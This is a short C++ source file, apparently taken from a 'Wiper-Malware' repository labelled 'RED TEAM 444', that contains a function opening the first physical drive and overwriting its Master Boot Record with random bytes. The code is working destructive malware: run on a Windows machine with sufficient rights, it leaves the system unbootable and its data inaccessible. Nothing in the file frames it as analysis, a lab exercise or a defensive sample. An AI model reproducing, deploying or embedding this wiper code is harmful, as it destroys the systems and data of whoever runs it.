/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

void wipeMBR() {
    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening physical drive for MBR wiping.\n";
        return;
    }

    // Buffer to overwrite MBR (first 512 bytes)
    char mbrBuffer[512] = {0};

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 255);
    for (int i = 0; i < 512; i++) {
        mbrBuffer[i] = static_cast<char>(dist(gen));  // Random bytes
    }

    DWORD bytesWritten;
    if (!WriteFile(hDrive, mbrBuffer, 512, &bytesWritten, NULL)) {
        std::cerr << "Error writing to drive to wipe MBR.\n";
    } else {
        std::cout << "MBR wiped successfully.\n";
    }

    CloseHandle(hDrive);
}
